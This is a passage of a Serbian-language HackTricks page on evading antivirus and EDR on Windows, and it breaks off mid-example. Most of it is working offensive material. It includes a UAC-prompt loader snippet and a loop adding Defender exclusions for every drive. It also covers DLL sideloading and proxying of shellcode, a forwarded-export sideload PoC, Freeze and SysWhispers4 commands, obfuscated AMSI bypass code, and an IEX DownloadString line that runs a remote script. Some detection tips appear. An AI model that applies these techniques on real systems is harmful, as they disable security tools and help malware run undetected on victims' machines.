# Zaobilaženje antivirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defendera, lažno se predstavljajući kao drugi AV.
- [Onemogućavanje Defendera ako ste administrator](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalacionog programa pre diranja Defendera

Javno dostupni loaderi koji se predstavljaju kao game cheats često dolaze kao nepotpisani Node.js/Nexe instalacioni programi koji prvo **zatraže od korisnika povišene privilegije**, a tek onda onesposobe Defender. Tok je jednostavan:

1. Proverite da li postoje administratorske privilegije pomoću `net session`. Komanda uspeva samo kada pozivalac ima administratorska prava, pa neuspeh znači da loader radi kao standardni korisnik.
2. Odmah ponovo pokrenite program koristeći glagol `RunAs` da biste aktivirali očekivani UAC zahtev za dozvolu, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „crackovan“ softver, pa obično prihvate prompt, čime malware dobija prava potrebna da promeni Defender-ovu politiku.<sup>[[26]](#references)</sup>

### Široka `MpPreference` izuzeća za svako slovo diska

Kada dobije povišene privilegije, lanci nalik GachiLoader-u maksimalno iskorišćavaju slepe tačke Defender-a, umesto da potpuno isključe servis. Loader prvo gasi GUI nadzorni proces (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka izuzeća** kako bi korisnički profili, sistemski direktorijumi i prenosivi diskovi bili izvan dometa skeniranja:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ključna zapažanja:

- Petlja prolazi kroz svaki montirani sistem datoteka (D:\, E:\, USB uređaje itd.), tako da se **svaki budući payload koji se smesti bilo gde na disku ignoriše**.
- Izuzimanje ekstenzije `.sys` predviđeno je za budućnost — napadači ostavljaju sebi mogućnost da kasnije učitavaju nepotpisane drajvere bez ponovnog diranja Defendera.
- Sve izmene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što narednim fazama omogućava da potvrde da su izuzeci sačuvani ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto se nijedna Defender usluga ne zaustavlja, površne provere ispravnosti i dalje prijavljuju da je „antivirus aktivan“, iako provera u realnom vremenu nikad ne obuhvata te putanje.<sup>[[26]](#references)</sup>

## **AV Evasion metodologija**

Trenutno AV rešenja koriste različite metode za proveru da li je datoteka zlonamerna: statičku detekciju, dinamičku analizu i, kod naprednijih EDR rešenja, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih zlonamernih nizova ili nizova bajtova u binarnoj datoteci ili skripti, kao i izdvajanjem informacija iz same datoteke (npr. opisa datoteke, naziva kompanije, digitalnih potpisa, ikone, kontrolne sume itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do vašeg otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Enkripcija**

Ako šifrujete binarnu datoteku, AV neće moći da otkrije vaš program, ali će vam biti potreban neki loader koji će dešifrovati i pokrenuti program u memoriji.

- **Obfuskacija**

Ponekad je dovoljno da promenite neke nizove u binarnoj datoteci ili skripti kako biste zaobišli AV, ali to može oduzeti dosta vremena, u zavisnosti od toga šta pokušavate da obfuskirate.

- **Prilagođeni alati**

Ako razvijete sopstvene alate, neće biti poznatih loših potpisa, ali za to je potrebno mnogo vremena i truda.

> [!TIP]
> Dobar alat za proveru da li Windows Defender otkriva statičke karakteristike jeste [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u osnovi deli datoteku na više segmenata, a zatim zadaje Defenderu da skenira svaki od njih pojedinačno; tako može tačno da vam kaže koji su nizovi ili bajtovi u binarnoj datoteci označeni.

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### Offline testovi PE karakteristika za statičke klasifikatore

Bajtovi upakovanog ili šifrovanog payload-a samo su jedan od ulaza u statički klasifikator. EMBER2024 izdvaja PE karakteristike, uključujući importe, eksporte, odeljke, zaglavlja i Authenticode podatke.<sup>[[48]](#references)</sup> U jednom eksperimentu sa loader-om, dodavanje 141 importa koji deluju bezazleno smanjilo je zlonamerni rezultat EMBER2024 za 93%, dok su importi povezani sa malverom povećali rezultat. Ovo je rezultat za taj model i te uzorke, a ne pouzdan način zaobilaženja određenog AV/EDR proizvoda.<sup>[[50]](#references)</sup>

Za ovlašćeno testiranje loader-a, zadržite payload i putanju izvršavanja nepromenjenim, menjajte po jednu predviđenu promenljivu pri izgradnji za svaku varijantu i uporedite rezultate van mreže. Pregledajte dobijene PE karakteristike, jer promena pri izgradnji može uticati na više grupa karakteristika.<sup>[[49]](#references)[[50]](#references)</sup> Da bi predviđeni importi ostali u IAT-u, pozivajte izabrane Win32 API-je iz dostupnog koda. Menjajte izbor i rasporedite mesta poziva kroz različite build-ove, umesto da pravite fiksnu funkciju za kamuflažu koja može postati potpis. Eksperiment je takođe pokazao niže rezultate uz validno potpisivanje koda, eksportne zapise i veći broj funkcija koje povećavaju `.pdata`; nevažeće potpisivanje imalo je mali uticaj, a uticaj `.pdata` bio je neznatan.<sup>[[50]](#references)</sup>

Paket `thrember` omogućava izdvajanje karakteristika i korišćenje benchmark modela. Nakon instalacije, upotrebite `thrember.download_models("models")` sa postojećim direktorijumom `models`, a zatim pokrenite ocenjivač iz njegovog nadređenog direktorijuma: pomoćna funkcija za preuzimanje menja trenutni radni direktorijum. PE klasifikator može da oceni direktorijum sa build-ovima, a da ih ne šalje servisu za skeniranje:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Zadržite verzije modela i ekstraktora karakteristika nepromenjenim tokom poređenja. Niži offline rezultat samo pokazuje kako ovaj klasifikator reaguje na promenjeni binarni fajl; ne dokazuje izbegavanje bihevioralne analize, emulacije ili drugačijeg modela nekog proizvođača.<sup>[[49]](#references)[[50]](#references)</sup> Za [polimorfizam po izgradnji i kamuflažu spoljnog binarnog fajla u virtuelizovanim payload-ovima](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), pogledajte zaseban model izvršavanja.

### **Dinamička analiza**

Dinamička analiza je kada AV pokrene vaš binarni fajl u sandbox-u i prati zlonamernu aktivnost (npr. pokušaj dešifrovanja i čitanja lozinki iz pregledača, pravljenje minidump-a procesa LSASS itd.). Sa ovim može biti malo teže raditi, ali evo nekoliko stvari koje možete da uradite da biste izbegli sandbox-ove.

- **Sačekajte pre izvršavanja** U zavisnosti od implementacije, ovo može biti odličan način da zaobiđete dinamičku analizu AV-a. AV-ovi imaju veoma malo vremena za skeniranje fajlova kako ne bi prekidali korisnikov rad, pa duža čekanja mogu da ometu analizu binarnih fajlova. Problem je u tome što mnogi AV sandbox-ovi mogu jednostavno da preskoče čekanje, u zavisnosti od njegove implementacije.
- **Provera resursa mašine** Sandbox-ovi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore korisnikovu mašinu. Ovde možete biti i veoma kreativni, na primer, proverom temperature CPU-a ili čak brzine ventilatora — sandbox neće imati implementirano baš sve.
- **Provere specifične za mašinu** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara i videti da li se poklapa sa onim koji ste naveli. Ako se ne poklapa, program može da se ugasi.

Ispostavlja se da se računar Microsoft Defender Sandbox-a zove HAL9TH. Zato u malware-u možete da proverite ime računara pre detonacije. Ako se ime poklapa sa HAL9TH, znači da ste unutar Defender sandbox-a, pa program može da se ugasi.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko zaista dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za suprotstavljanje sandbox-ovima

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanal #malware-dev</p></figcaption></figure>

Kao što smo već rekli u ovom tekstu, **javni alati** će pre ili kasnije **biti detektovani**, zato treba da se zapitate sledeće:

Na primer, ako želite da izvučete dump LSASS-a, **da li zaista morate da koristite mimikatz**? Ili biste mogli da koristite neki manje poznat projekat koji takođe pravi dump LSASS-a?

Verovatno je tačno ovo drugo. Uzmimo mimikatz za primer: verovatno je jedan od, ako ne i najčešće označavanih malware-a od strane AV-ova i EDR-ova. Iako je sam projekat zaista odličan, veoma je teško raditi s njim i zaobilaziti AV-ove, zato samo potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate payload-e radi izbegavanja detekcije, obavezno **isključite automatsko slanje uzoraka** u Defender-u i, molimo vas, ozbiljno, **NEMOJTE OTPREMANJAJTE NA VIRUSTOTAL** ako vam je cilj dugoročno izbegavanje detekcije. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **dajte prednost korišćenju DLL-ova radi izbegavanja detekcije**. Po mom iskustvu, DLL fajlovi se obično **mnogo ređe detektuju** i analiziraju, pa je ovo veoma jednostavan trik za izbegavanje detekcije u nekim slučajevima (naravno, ako vaš payload može da se pokrene kao DLL).

Kao što možemo videti na ovoj slici, Havoc DLL Payload ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje na antiscan.me između uobičajenog Havoc EXE payload-a i uobičajenog Havoc DLL-a</p></figcaption></figure>

Sada ćemo prikazati nekoliko trikova koje možete koristiti sa DLL fajlovima da biste bili mnogo neprimetniji.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi redosled pretrage DLL-ova koji primenjuje loader tako što postavlja aplikaciju žrtve i zlonamerne payload-ove jedan pored drugog.

Programe podložne DLL Sideloading-u možete pronaći pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće PowerShell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će prikazati listu programa podložnih DLL hijacking-u u okviru „C:\Program Files\\“ i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite programe podložne DLL Hijack-u/Sideload-u**. Ako se pravilno izvede, ova tehnika je prilično neupadljiva, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje neće učitati vaš payload, jer program očekuje da se u tom DLL-u nalaze određene funkcije. Da bismo rešili ovaj problem, koristićemo drugu tehniku pod nazivom **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i zlonamernog) DLL-a na originalni DLL, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/).

Ovo su koraci koje sam pratio:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je to uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t-ov twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), da biste detaljnije saznali više o onome o čemu smo razgovarali.

### Zloupotreba prosleđenih izvoza (ForwardSideLoading)

Windows PE moduli mogu da izvoze funkcije koje su zapravo „forwarders“: umesto da upućuje na kod, unos izvoza sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac razrešava izvoz, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važno ponašanje koje treba razumeti:
- Ako je `TargetDll` KnownDLL, obezbeđuje se iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji obuhvata direktorijum modula koji obavlja prosleđivanje.

To omogućava indirektan primitiv za sideloading: pronađite potpisani DLL koji izvozi funkciju prosleđenu modulu čije ime nije KnownDLL, a zatim smestite taj potpisani DLL zajedno sa DLL-om pod kontrolom napadača, nazvanim tačno kao prosleđeni ciljni modul. Kada se pozove prosleđeni izvoz, loader razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, čime se izvršava vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen na Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nije KnownDLL, pa se razrešava uobičajenim redosledom pretrage.

PoC (kopiraj-nalepi):
1) Kopirajte potpisani sistemski DLL u direktorijum u koji može da se upisuje
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan za izvršavanje koda; ne morate implementirati prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktivirajte prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Dok razrešava `KeyIsoSetAuditingInterface`, loader prati prosleđivanje do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku „missing API“ tek nakon što se `DllMain` već izvrši

Hunting tips:
- Usredsredite se na prosleđene exports kod kojih ciljni modul nije KnownDLL. KnownDLL-ovi su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete nabrojati prosleđene exports pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwardera da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz putanja koje nisu sistemske, a zatim učitavaju DLL-ove koji nisu KnownDLLs, ali imaju isto osnovno ime, iz tog direktorijuma
- Upozorite na lance procesa/modula poput: `rundll32.exe` → `keyiso.dll` koji nije iz sistemske putanje → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Primenite smernice za integritet koda (WDAC/AppLocker) i zabranite pisanje i izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete da koristite Freeze da biste neprimetno učitali i izvršili svoj shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša; ono što funkcioniše danas može biti otkriveno sutra, zato se nikad ne oslanjajte samo na jedan alat. Ako je moguće, pokušajte da povežete više tehnika evasion-a.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na syscall stub-ove u `ntdll.dll`. Da biste zaobišli te hook-ove, možete da generišete **direct** ili **indirect** syscall stub-ove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hook-ovane export entrypoint funkcije.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: emituje instrukciju `syscall`/`sysenter`/`SVC #0` u generisanom stub-u (ne pristupa se export-u iz `ntdll`).
- **Indirect**: skače u postojeći **syscall gadget** unutar `ntdll`, tako da izgleda kao da prelaz u kernel potiče iz `ntdll` (korisno za izbegavanje heurističke detekcije); **randomized indirect** bira gadget iz skupa za svaki poziv.
- **Egg-hunt**: izbegava ugrađivanje statičkog niza opcode-ova `0F 05` na disk; pronalazi syscall sekvencu tokom izvršavanja.

**Strategije za određivanje SSN-a otporne na hook-ove:**
- **FreshyCalls (VA sort)**: određuje SSN-ove sortiranjem syscall stub-ova prema virtuelnoj adresi umesto čitanjem bajtova stub-a.
- **SyscallsFromDisk**: mapira čistu `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog `.text`, a zatim je odmapira (zaobilazi sve hook-ove u memoriji).
- **RecycledGate**: kombinuje određivanje SSN-a sortiranjem po VA sa proverom opcode-ova kada je stub čist; ako je hook-ovan, koristi određivanje prema VA.
- **HW Breakpoint**: postavlja DR0 na instrukciju `syscall` i koristi VEH za hvatanje SSN-a iz `EAX` tokom izvršavanja, bez parsiranja hook-ovanih bajtova.

Primer upotrebe SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Pri parsiranju clean x64 `ntdll` syscall exporta radi SSN-a, prihvatite i `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) i isti niz kojem prethodi `F3 0F 1E FA` (`endbr64`). Drugi niz je stub sa CET prefiksom: parser koji pretpostavlja da se SSN uvek nalazi na jednom fiksnom pomeraju neće ga pronaći. Ako inicijalizacija indirect-syscall-a ne uspe i loader pređe na `GetProcAddress`, pozivi kroz te exporte mogu ponovo naići na user-mode hook-ove.<sup>[[54]](#references)</sup>

### Alternativni syscall exporti u `tprtdll.dll`

Projekat navodi `tprtdll.dll` kao Microsoft-om potpisan DLL prisutan u `C:\Windows\System32\` na Windows 11 build-u 26100 i novijim verzijama. Ima zasebne adrese koda u odnosu na `ntdll.dll`, pa hook koji menja samo `ntdll` syscall entrypoint ne menja odgovarajući `tprtdll` stub. Za razliku od gore navedenih metoda za razrešavanje SSN-a, ovaj pristup učitava `tprtdll.dll` i direktno poziva dostupni `Nt*` ili `Zw*` export preko `GetProcAddress`. Proverite da DLL i potrebni exporti postoje i koristite odgovarajuće prototipe NT funkcija.<sup>[[55]](#references)</sup>

Self-injection PoC koristi `tprtdll!NtAllocateVirtualMemoryEx` za alokaciju RW memorije, kopira bajtove pomoću `memcpy`, menja region u RX pomoću `tprtdll!ZwProtectVirtualMemory` i pokreće nit pomoću `tprtdll!RtlCreateUserThread`.<sup>[[56]](#references)</sup> Varijanti za više procesa potreban je dostupan handle ciljnog procesa, a za kopiranje koristi `WriteProcessMemory`.<sup>[[57]](#references)</sup> U inventaru exporta projekta nedostaju `NtOpenProcess`, `NtWriteVirtualMemory` i `NtCreateThreadEx`, pa ne može svaka operacija injection-a da koristi alternativni export.<sup>[[55]](#references)</sup>

PoC ne dokazuje da je `RtlCreateUserThread` direktan syscall stub niti da njegovi interni pozivi zaobilaze `ntdll` hook-ove samo zato što je export razrešen iz `tprtdll`.<sup>[[56]](#references)</sup> Primer za više procesa takođe ugrađuje adrese `WinExec` i `ExitThread` razrešene u injector-u; te adrese moraju biti važeće u ciljnom procesu da bi payload primera funkcionisao.<sup>[[57]](#references)</sup>

Ovim se zaobilaze samo hook-ovi ograničeni na odgovarajuće `ntdll` exporte; syscalls se time ne skrivaju od nadzora na nivou kernela.<sup>[[55]](#references)</sup> Za injection putanju koja umesto toga izbegava udaljeno upisivanje i kreiranje novih niti, pogledajte [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku su AV rešenja mogla da skeniraju samo **datoteke na disku**, pa ako biste nekako mogli da izvršite payload-e **direktno u memoriji**, AV ne bi mogao ništa da uradi kako bi to sprečio, jer ne bi imao dovoljno uvida.

AMSI funkcija je integrisana u ove Windows komponente.

- Kontrola korisničkog naloga, odnosno UAC (podizanje privilegija pri instalaciji EXE, COM, MSI ili ActiveX sadržaja)
- PowerShell (skripte, interaktivna upotreba i dinamičko izvršavanje koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Antivirusnim rešenjima omogućava da pregledaju ponašanje skripti tako što im izlaže sadržaj skripti u nešifrovanom i neobfuskovanom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Primetite kako dodaje prefiks `amsi:`, a zatim putanju do izvršne datoteke iz koje je skripta pokrenuta — u ovom slučaju, powershell.exe.

Nismo zapisali nijednu datoteku na disk, ali nas je AMSI ipak uhvatio u memoriji.

Štaviše, počevši od **.NET 4.8**, C# kod se takođe obrađuje kroz AMSI. Ovo utiče čak i na `Assembly.Load(byte[])` za učitavanje koda koji se izvršava u memoriji. Zato se za izvršavanje u memoriji preporučuje korišćenje starijih verzija .NET-a (poput 4.7.2 ili starijih) ako želite da izbegnete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuskacija**

Pošto AMSI uglavnom radi pomoću statičkih detekcija, menjanje skripti koje pokušavate da učitate može biti dobar način da izbegnete detekciju.

Međutim, AMSI može da ukloni obfuskaciju sa skripti čak i kada imaju više slojeva, pa obfuskacija može biti loša opcija, u zavisnosti od toga kako je izvedena. Zbog toga zaobilaženje nije sasvim jednostavno. Ipak, ponekad je dovoljno promeniti nekoliko naziva promenljivih, pa će sve biti u redu — sve zavisi od toga koliko je nešto već označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell (kao i cscript.exe, wscript.exe itd.), moguće ga je lako menjati čak i kada se radi kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Izazivanje greške**

Ako se inicijalizacija AMSI-ja natera da ne uspe (`amsiInitFailed`), skeniranje se neće pokrenuti za trenutni proces. Ovo je prvobitno objavio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis kako bi sprečio širu upotrebu ove tehnike.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bila je dovoljna jedna linija PowerShell koda da AMSI učini neupotrebljivim u trenutnom PowerShell procesu. AMSI je, naravno, označio ovu liniju, pa je potrebno napraviti neke izmene da bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass-a koji sam preuzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Imajte na umu da će ovo verovatno biti označeno čim ovaj post bude objavljen, zato nemojte objavljivati kod ako vam je cilj da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/). Ona podrazumeva pronalaženje adrese funkcije „AmsiScanBuffer“ u amsi.dll (zadužene za skeniranje unosa koji je dostavio korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na taj način rezultat stvarnog skeniranja postaje 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Preusmeravanje AMSI COM pokazivača za skeniranje umesto patchovanja `AmsiScanBuffer`

Drugi bypass, ograničen na lokalni proces, ne menja ulaznu tačku `AmsiScanBuffer`. U prijavljenom 64-bitnom .NET loader-u, AMSI COM objekat se kreira pomoću CLSID-ja `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` vraća pokazivač na interfejs, a njegov vtable slot na pomeraju `0x18` koristi se kao odredište poziva za skeniranje. Loader patchuje izvorni pokazivač za `Console.Clear()` malim x64 stubom, menja taj vtable unos pomoću `VirtualProtect()`, a zatim vraća prvobitnu zaštitu stranice. Neophodni preduslovi su 64-bitna širina pokazivača i očekivani COM raspored; ovo nije univerzalni pomeraj za proizvoljne AMSI interfejse ili build-ove. Ranije uočene faze su [učitavanje potpisanog AppDomainManager sidecar-a](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) i [RESX deserializacija](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Uočeni bajtovi stuba su `41 C7 00 01 00 00 00 33 C0 C3`: oni upisuju **1** u pokazivač rezultata u `r8` i vraćaju **0** u `eax`. Prema tome, prijavljena tvrdnja da je rezultat skeniranja `AMSI_RESULT_CLEAN` (0) meša povratnu vrednost `S_OK` sa izlaznom enumeracijom. Prema dokumentovanom redosledu `AMSI_RESULT`, rezultat **1** je `AMSI_RESULT_NOT_DETECTED`; i dalje je ispod praga detekcije.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon učitavanja `amsi.dll` u trenutni proces. Robustan bypass nezavisan od jezika jeste postavljanje korisničkog hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je traženi modul `amsi.dll`. Zbog toga se AMSI nikada ne učitava i za taj proces se ne obavljaju skeniranja.<sup>[[23]](#references)</sup>

Osnovni prikaz implementacije (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

